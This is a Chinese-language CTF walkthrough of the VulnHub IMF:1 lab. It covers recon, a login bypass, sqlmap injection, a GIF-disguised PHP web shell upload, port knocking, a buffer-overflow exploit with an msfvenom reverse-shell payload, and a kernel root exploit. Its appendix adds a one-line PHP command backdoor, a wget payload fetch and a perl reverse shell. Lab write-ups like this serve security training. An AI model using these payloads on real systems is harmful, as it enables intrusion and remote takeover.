---
title: IMF-1
author: Creexile
date: 2024-09-27 17:59:01
lastMod: 2025-04-29
summary: 'No.5'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [提权, 漏洞利用, 端口敲击, 缓冲区溢出, 渗透]
---

# IMF: 1

---

No.5

> 来源: [vulnhub靶场-IMF:1](https://www.vulnhub.com/entry/imf-1,162/)
>
> 目标: you must hack to get all flags and ultimately root
>
> 妙妙工具: python3 -c 'import pty; pty.spawn("/bin/bash")'

## 环境配置

- kali: 192.168.204.129
- ubuntu: 192.168.204.134
- kali2: 192.168.56.6
- ubuntu2: 192.168.56.11

环境出问题了, 我得换一个

## 信息收集

nmap发现仅开启tcp 80

```bash
nmap -sS 192.168.204.0/24

Nmap scan report for 192.168.204.134
Host is up (0.00041s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:64:79:57 (VMware)
```

### flag2

网页源码中扒拉发现`/contact.php`的头中发现有几个base64, 解码发现不行, 后来发现是将他们拼起来再解码

![image-20240816115945739](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816115945739.png)

得到`flag2{aW1mYWRtaW5pc3RyYXRvcg==}`再进行解码可以得到`imfadministrator`

直接拿到flag2了?再找一下flag1:

### flag1

在`/contact.php`源码搜索flag, 发现存在`flag1{YWxsdGhlZmlsZXM=}`, 进行base64解码后是`allthefiles`

![image-20240816115145675](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816115145675.png)

访问`/imfadministrator`发现是一个登录界面, 源码处发现提示:

```
 I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger
```

先找找哪里有用户名, 发现还是`/contact.php`界面底下有三个邮箱, 前面应该是用户名

```
rmichaels@imf.local
akeith@imf.local
estone@imf.local
```

测试发现是存在用户名`rmichaels`, 但是密码错误, 跑字典跑半天不说, 还把靶机跑无响应了

### flag3

再回来看提示, 硬编码似乎是直接将将密码直接写在代码中然后通过函数与输入进行判断, 就赌这个判断函数有问题了

> 一般存密码方式都是hash值, md5和sha在php中都存在数组和0e绕过, 这里就尝试了数组绕过

![image-20240816122922444](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816122922444.png)

现在使用数组还是0e后无论我输入的是什么甚至为空, 都会返回`flag3{Y29udGludWVUT2Ntcw==}`, 解码后为`continueTOcms`

点击超链接访问给的新的网址`/imfadministrator/cms.php?pagename=home`, 页面完全无交互, 扫不出东西, 尝试对url做文章:

```
/imfadministrator/cms.php?pagename=home'
Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29
```

可以看到报错而且是mysql数据库, 可能存在sql注入

### flag4

> 这里把所有可见符号都跑了一遍, 问就是曾经用到过

```powershell
python3 .\sqlmap.py -u "http://192.168.204.134/imfadministrator/cms.php?pagename=home" --cookie="PHPSESSID=evaam456bvuqsl21a62i26sun2" --dump
```

利用sql爆表可以得到一张图片`/imfadministrator/images/whiteboard.jpg`, 扫描图片的二维码可以得到`flag4{dXBsb2Fkcjk0Mi5waHA=}`, 解码后为`uploadr942.php`, 尝试访问`/imfadministrator/uploadr942.php`, 发现文件上传

## getshell

### flag5

只能上传jpg, gif和png, 过滤eval以及exec

尝试weevely:

```bash
weevely generate cmd muma.gif
```

然后利用vim在前面加上gif的文件头GIF89a即可, 应该是可以正常上传的, 在源码中可以找到文件名

![image-20240816132639333](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816132639333.png)

然后寻找文件所在位置, 应该是`/imfadministrator/uploads/0473994f47f0.gif`, 然后就可以利用weevely连接木马

```bash
weevely http://192.168.204.134/imfadministrator/uploads/0473994f47f0.gif cmd
```

![image-20240816132924805](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816132924805.png)

> 还有一些方法就写在附录了, 其实也是绕过

就在当前目录下有`flag5_abc123def.txt`, 得到`flag5{YWdlbnRzZXJ2aWNlcw==}`, 解出来`agentservices`, 代理服务?寻找一下叫做agent的文件

```bash
find / -name agent &>1/dev/unll
# /usr/local/bin/agent
# /etc/xinetd.d/agent
```

在`/usr/local/bin/`下的access_code, 提示了端口敲击顺序

![image-20240926213617680](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926213617680.png)

> Port Knocking(端口敲击), 用于增强安全性, 巧妙地隐蔽端口; 需要一定的敲击顺序才能打开隐藏端口
>
> 能提高系统的安全性, 降低受到自动攻击的风险

我们再来看看哪些端口被占用, 可能的隐藏端口为7788

```bash
netstat -ant
# 3306, 22, 7788
```

下载端口敲击工具运行后重新进行端口扫描: [knock](https://github.com/grongor/knock)

```bash
./knock -v 192.168.56.11 7482 8279 9467
nmap -A -p 1-10000 192.168.56.11
```

![image-20240927104240519](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927104240519.png)

尝试nc连接后发现需要输入Agent ID, 我们并没有这个, 将靶机文件下载下来:

```bash
nc 192.168.56.11 7788
file_download /usr/local/bin/agent /home/kali/Desktop/
```

对agent进行检查(GDB环境), 没有启用栈溢出保护机制, 且`No PIE`意味着程序装载到内存中的地址固定

![image-20240927163151213](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927163151213.png)

> 我这里用的是一个装好pwn环境的虚拟机, 你可能需要在kali安装gdb, 命令也可能不同

使用ltrace跟踪agent在执行过程中调用库函数的情况

fget就是获取输入, 随意输入后看到判断由函数strncmp完成对比, 而对比的就是我们要的ID: `48093572`

![image-20240927151905422](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927151905422.png)

也可以用IDA, F5查看还原出来的伪代码

![image-20240927164744940](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927164744940.png)

## 提权

既然该程序有缓冲区溢出漏洞, 那就是利用了, 我没学过pwn导致我不清楚怎么做, 那就交给大佬了:

[渗透项目（八）：IMF-1](https://blog.csdn.net/weixin_43938645/article/details/128594803?ops_request_misc=%257B%2522request%255Fid%2522%253A%25225687D4F7-30B2-4167-99D4-B343E7E28B67%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=5687D4F7-30B2-4167-99D4-B343E7E28B67&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128594803-null-null.142^v100^pc_search_result_base4&utm_term=IMF-1&spm=1018.2226.3001.4187)

或者直接当脚本小子:

脚本网址: https://github.com/jessekurrus/agentsploit

msfvenom创建一个shellcode:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.6 LPORT=6666 -f python -b "\x00\x0a\x0d"
# 避免脚本中有这三个字符
```

然后将生成的字符串替换脚本中的内容

![image-20240927171822546](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927171822546.png)

然后监听对应端口, 运行脚本即可

```bash
nc -lvnp 6666
python2 agentsploit.py 192.168.56.11 7788
```

![image-20240927172225216](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927172225216.png)

最后再`/root`目录下找到了flag6, 解码出来是 Gh0stProt0c0ls

![image-20240927172513752](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927172513752.png)

好了现在让我们来试试其他方式提权:

- 权限: www-data
- 系统:
  发布版本: Ubuntu 16.04 LTS
  内核: 4.4.0-45-generic x86_64
- 环境: python3, gcc

网上一查就能有[Ubuntu 16.04漏洞复现(CVE-2017-16995)](https://www.cnblogs.com/SeanGyy/p/15709712.html), 在kali寻找对应脚本有`45010.c`

上传上去编译执行就能拿到root权限

![image-20240927175304503](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927175304503.png)

## 附录

### 关于不使用weevely

```php
GIF89a
<?php $cmd=$_GET['cmd']; echo `$cmd`;?>
```

这个文件可以正常上传, 不过需要再下载木马到靶机进行后续操作

> 我的建议是先上蚁剑, 不然会有一大堆问题, 比如上传没有权限运行不了但是没有回显

```shell
python3 -m http.server 12000
http://192.168.56.11/imfadministrator/uploads/05d32e2a9585.gif?cmd=wget http://192.168.56.6:11000/shell.elf
```

![image-20240927113220913](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240927113220913.png)

不过还有一种方法, 因为靶机安装了python3, 而且有perl, 利用perl反弹shell, [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
perl -e 'use Socket;$i="192.168.56.11";$p=6677;socket(S,PF_INET,SOCK_STREAM,getproto
byname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```
